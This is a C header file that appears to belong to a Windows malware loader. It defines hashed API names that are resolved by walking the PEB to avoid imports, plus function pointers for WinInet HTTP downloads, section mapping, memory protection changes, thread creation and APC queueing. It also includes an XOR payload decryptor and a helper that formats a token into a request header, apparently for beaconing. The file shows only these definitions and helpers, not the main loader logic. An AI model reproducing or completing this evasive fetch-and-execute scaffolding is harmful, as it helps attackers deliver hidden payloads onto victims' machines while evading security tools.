#include <windows.h>
#include <wininet.h>

#define STATUS_SUCCESS 0x00000000
#define NT_SUCCESS(STATUS)((NTSTATUS)STATUS>=STATUS_SUCCESS)

// MODULE HASHES

#define KERNEL32_HASH	0x779b2700
#define NTDLL_HASH		0x57552168


// API HASHES
#define VIRTUALPROTECT_HASH	0x7edacbc8
#define CREATETHREAD_HASH	0x86e6093c
#define WAITFORSINGLEOBJECT_HASH 0xa1fa3925
#define LOADLIBRARYA_HASH 0xef6a4586 
#define InternetOpenA_HASH 0x8fcb044c
#define InternetConnectA_HASH 0x71040d54
#define HttpOpenRequestA_HASH 0x213109c
#define HttpSendRequestA_HASH 0x37e92584
#define HttpQueryInfoA_HASH 0x94e63723
#define InternetQueryDataAvailable_HASH 0xb1740aa
#define InternetReadFile_HASH 0xd05753f5
#define InternetCloseHandle_HASH 0x31503dcb
#define calloc_HASH 0x8e5164e
#define free_HASH 0x82d52
#define NtCreateSection_HASH 0x9445102b
#define NtMapViewOfSection_HASH 0xec734615
#define CreateFileW_HASH 0x7147082b
#define SleepEx_HASH 0x81166416
#define QueueUserAPC_HASH 0x520a5358


typedef struct _PEB_LDR_DATA {
	BYTE       Reserved1[8];
	PVOID      Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef VOID(NTAPI* PPS_POST_PROCESS_INIT_ROUTINE)(VOID);

typedef struct _PEB {
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3[2];
	PPEB_LDR_DATA                 Ldr;
	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
	PVOID                         Reserved4[3];
	PVOID                         AtlThunkSListPtr;
	PVOID                         Reserved5;
	ULONG                         Reserved6;
	PVOID                         Reserved7;
	ULONG                         Reserved8;
	ULONG                         AtlThunkSListPtr32;
	PVOID                         Reserved9[45];
	BYTE                          Reserved10[96];
	PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
	BYTE                          Reserved11[128];
	PVOID                         Reserved12[1];
	ULONG                         SessionId;
} PEB, * PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;


typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* fnNtCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, ULONG CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

// WinInet.DLL Function Definitions 
typedef HINTERNET(WINAPI* fnInternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);

typedef HINTERNET(WINAPI* fnInternetConnectA)(
	HINTERNET     hInternet,
	LPCSTR        lpszServerName,
	INTERNET_PORT nServerPort,
	LPCSTR        lpszUserName,
	LPCSTR        lpszPassword,
	DWORD         dwService,
	DWORD         dwFlags,
	DWORD_PTR     dwContext
);

typedef HINTERNET(WINAPI* fnHttpOpenRequestA)(
	HINTERNET hConnect,
	LPCSTR    lpszVerb,
	LPCSTR    lpszObjectName,
	LPCSTR    lpszVersion,
	LPCSTR    lpszReferrer,
	LPCSTR* lplpszAcceptTypes,
	DWORD     dwFlags,
	DWORD_PTR dwContext
);

typedef BOOL(WINAPI* fnHttpSendRequestA)(
	HINTERNET hRequest,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength
);

typedef BOOL(WINAPI* fnHttpQueryInfoA)(
	HINTERNET hRequest,
	DWORD     dwInfoLevel,
	LPVOID    lpBuffer,
	LPDWORD   lpdwBufferLength,
	LPDWORD   lpdwIndex
);

typedef BOOL(WINAPI* fnInternetQueryDataAvailable)(
	HINTERNET hFile,
	LPDWORD   lpdwNumberOfBytesAvailable,
	DWORD     dwFlags,
	DWORD_PTR dwContext
);

typedef BOOL(WINAPI* fnInternetReadFile)(
	HINTERNET hFile,
	LPVOID    lpBuffer,
	DWORD     dwNumberOfBytesToRead,
	LPDWORD   lpdwNumberOfBytesRead
);

typedef BOOL(WINAPI* fnInternetCloseHandle)(
	HINTERNET hInternet
);

// MSVCRT.DLL Function Definitions 

typedef void*(WINAPI* fncalloc)(
	size_t number,
	size_t size
);

typedef void(WINAPI* fnfree)(
	void* memblock
);




// Kernel32.dll
typedef BOOL(WINAPI* fnVirtualProtect)(
	PVOID lpAddress,
	SIZE_T dwSize,
	WORD  flNewProtect,
	PDWORD lpflOldProtect
);

typedef HANDLE(WINAPI* fnCreateThread)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
);

typedef DWORD(WINAPI* fnWaitForSingleObject)(
	HANDLE hHandle,
	DWORD  dwMilliseconds
);

typedef HMODULE(WINAPI* fnLoadLibraryA)(
  LPCSTR lpLibFileName
);

typedef HANDLE(WINAPI* fnCreateFileW)(
  LPCWSTR               lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);

typedef struct _NTAPIFP {
	fnNtCreateSection pNtCreateSection;
	fnNtMapViewOfSection pNtMapViewOfSection;
	fnCreateFileW pCreateFileW;
}NTAPIFP, * PNTAPIFP;

typedef DWORD(WINAPI* fnSleepEx)(
  DWORD dwMilliseconds,
  BOOL  bAlertable
);

typedef DWORD(WINAPI* fnQueueUserAPC)(
  PAPCFUNC  pfnAPC,
  HANDLE    hThread,
  ULONG_PTR dwData
);


__forceinline VOID my_memcpy(VOID* dest, VOID* src, SIZE_T szSize) {

	char * a = (CHAR *)dest;
	char * b = (CHAR *)src;

	for (int i = 0; i < szSize; i++) {
		a[i] = b[i];
	}

}

__forceinline DWORD HashDjb2W (WCHAR* pString) {

	ULONG Hash = 0;
	int c;

	while(c = *pString++) {
		Hash = ((Hash << 4) + Hash) + c;
	}

	return Hash;
}

__forceinline DWORD HashDjb2A (CHAR* pString) {

	ULONG Hash = 0;
	int c;

	while(c = *pString++) {
		Hash = ((Hash << 4) + Hash) + c;
	}

	return Hash;
}

void headercat(CHAR *header, UINT64 uToken) {
	for (int i = 7, j=0; i >= 0; i--, j+=2) {
		int x = (uToken >> (8 * (i))) & 0xFF ;
		int q, r;
		q = x / 16;
		r = x % 16;
		header[18 + j] = (q >= 10) ? (q - 10) + 'a' : q + '0';
		header[18 + j + 1] = (r >= 10) ? (r - 10) + 'a' : r + '0';
	}
}

VOID XorDecrypt(CHAR* data, CHAR cKey, DWORD dwSize) {

	for (int i = 0; i < dwSize; i++) {
		data[i] = data[i] ^ cKey;
	}

}